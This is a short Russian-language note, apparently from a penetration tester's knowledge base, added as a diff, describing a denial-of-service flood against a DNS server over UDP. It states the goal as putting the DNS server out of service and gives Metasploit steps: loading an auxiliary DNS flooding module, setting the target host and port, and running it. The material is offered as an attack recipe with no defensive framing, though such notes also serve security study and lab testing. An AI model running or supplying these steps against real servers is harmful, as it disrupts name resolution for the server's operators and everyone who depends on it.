@@ -1,0 +1,22 @@
+#attacks #dns 
+
+> DDoS атака на DNS сервер с использованием протокола DNS через UDP
+
+# Цель 
+Выведение DNS сервера из строя
+
+# Атака 
+
+1) В [[Metasploit]] готовим нагрузку
+```bash
+use auxiliary/dos/dns/<нужный нам тип DNS flooding>
+```
+
+2) Устанавливаем параметры
+```
+RHOST <ip>
+RPORT <port>
+
+exploit
+```
+
